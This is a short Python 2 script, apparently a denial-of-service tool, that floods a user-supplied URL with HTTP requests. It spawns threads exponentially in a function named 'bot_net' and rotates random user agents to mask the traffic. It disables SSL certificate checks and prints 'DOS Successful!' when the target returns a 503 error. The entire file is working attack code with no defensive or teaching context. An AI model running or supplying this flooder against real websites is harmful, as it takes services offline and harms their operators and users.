import threading
import urllib2
import random as r
import ssl

mn = 0
mx = 0
d = 0
i = 1
agents_array=[]

target = raw_input('URL: ')
ctx = ssl._create_unverified_context() #Create context
with open("user-agents.txt") as file:
	for line in file:
		agents_array.append(line)

def send_req(f):
	global target
	try:
		req=urllib2.Request(target,headers={'User-Agent':'%s'%r.choice(agents_array).replace('\n','')}) #Add random user Agent
		urllib2.urlopen(req,context=ctx)
	except urllib2.HTTPError as e:
		if e.code == 503: # Request Limit Reached
			print 'DOS Successful!'
		if e.code == 404: #Page not Found
			print 'Please Enter valid URL'

def bot_net(mn,mx,argfn):
	global i
	i+=1
	print 'Request %d'%i
	if i>mx:
		return 0
	send_req(i)
	for j in range(mn,i):
		thread = threading.Thread(target=bot_net,args=(mn,mx,argfn,))
		thread.start()

bot_net(1,500,send_req) #Creates Network that sends requests to website in exponential manner
'''
Threads Structure
*
**
****
********
****************
********************************
...
'''
